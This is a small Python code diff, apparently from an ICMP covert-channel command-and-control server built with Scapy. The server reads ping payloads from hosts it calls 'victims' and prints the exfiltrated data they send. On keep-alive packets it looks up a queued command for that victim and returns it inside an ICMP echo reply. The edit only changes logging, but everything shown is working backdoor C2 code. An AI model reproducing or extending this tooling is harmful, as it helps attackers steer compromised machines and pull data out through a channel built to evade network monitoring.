@@ -42,9 +42,10 @@ def handle_load(load, path):
         return ""
 
     if("d" in deserialized_load.keys()):
-        print("data packet\n")
+        print(f"data packet from: {victim_name}\n")
+        print(f"data received: {deserialized_load["d"]}\n")
     else:
-        print("keep-alive packet\n")
+        print(f"keep-alive packet from: {victim_name}\n")
         command = get_victim_command(victim_name, path)
         return command
 
@@ -60,9 +61,7 @@ def handle_ping(pkt):
             seq=pkt[2].seq
             id=pkt[2].id
             load = pkt[3].load.decode('UTF-8')
-            print(load)
             command = handle_load(load, path)
-            
             if(command):
                 reply = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/command
                 send(reply,verbose=False)
